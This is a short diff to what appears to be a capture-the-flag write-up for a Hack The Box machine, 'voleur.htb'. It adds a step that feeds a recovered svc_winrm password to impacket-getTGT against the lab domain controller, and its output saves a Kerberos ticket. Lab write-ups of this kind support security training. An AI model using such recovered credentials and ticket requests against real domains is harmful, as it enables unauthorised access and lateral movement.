@@ -390,6 +390,14 @@ Stopped: Mon Oct  5 17:42:26 2026
 
 svc_winrm:AFireInsidedeOzarctica980219afi
 
+```
+impacket-getTGT -dc-ip 10.129.232.130 voleur.htb/svc_winrm:'AFireInsidedeOzarctica980219afi'
+Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Saving ticket in svc_winrm.ccache
+
+```
+
 ---
 ## User Flag
 
